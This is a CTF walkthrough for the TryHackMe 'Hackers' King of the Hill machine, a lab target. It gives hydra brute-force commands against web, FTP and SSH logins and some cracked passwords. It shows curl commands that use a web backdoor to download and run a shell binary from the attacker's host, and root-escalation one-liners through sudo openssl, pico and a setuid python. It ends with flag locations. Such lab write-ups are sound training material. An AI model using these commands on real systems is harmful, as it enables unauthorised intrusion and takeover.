# Hackers KOTH machine

## foothold

The ports are 21, 22 and 80. On 21 anonymous, can recover two user names, `rcampbell` and `gcrawford` that have weak passwords, as well as a `.flag`
on the site, there is a 'backdoor'. The username is `plague`, the password must be bruted. this will get a webshell as production.

so there are two avenues in, via bruting: 

- the web backdoor with plague: `hydra -l plague -P rockyou.txt -t 64 10.10.107.80 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"`
 - have also had success with `xato-net-10-million-passwords-100000.txt`
 - once a password is found, the following curl commands can establish a rush shell:

  ```
  curl -d "username=plague&password=PASS" RHOST/api/login # gets the session key
  curl -H "Cookie: SessionToken=SESSIONKEY" -d "wget LHOST:1234/client -O .bash && chmod +x .bash && ./.bash" RHOST/api/cmd
  ```

- the ssh and ftp services with rcampbell and gcrawford. put these into users.txt and run `hydra -L users.txt -P rockyou.txt -t 64 ftp://10.10.107.80` and 
 `hydra -L users.txt -P rockyou.txt ssh://10.10.107.80`
 
i suspect rockyou is not the best - examining the plague server, it seems to consist of common english words - i have broken in with `caravan`, and through ssh with rcampbell as `hernandez`. I have also run hydra for the whole hour with rockyou and gotten nowhere.

## paths to root

- production can run `openssl` as root via sudo. read any file with `sudo openssl enc -in source`, and write files with `sudo openssl enc -in source -out dest` or `cat source | sudo openssl -out dest`
 - this can be removed with `rm /etc/sudoers.d/production`
- gcrawford can run `pico` as root via sudo
 - this can be removed with `rm /etc/sudoers.d/gcrawford`
- otherwise `/usr/bin/python3.6` has the setuid capability, and can get a root shell via: `/usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
 - this can be removed with `setcap -r /usr/bin/python3.6`

## flags

- /root/.flag
- /home/gcrawford/business.txt
- /home/tryhackme/.flag
- /home/rcampbell/.flag
- /home/production/.flag
- /home/production/webserver/resources/main.css
- /var/ftp/.flag
- /etc/vsftpd.conf
- /etc/ssh/sshd_config
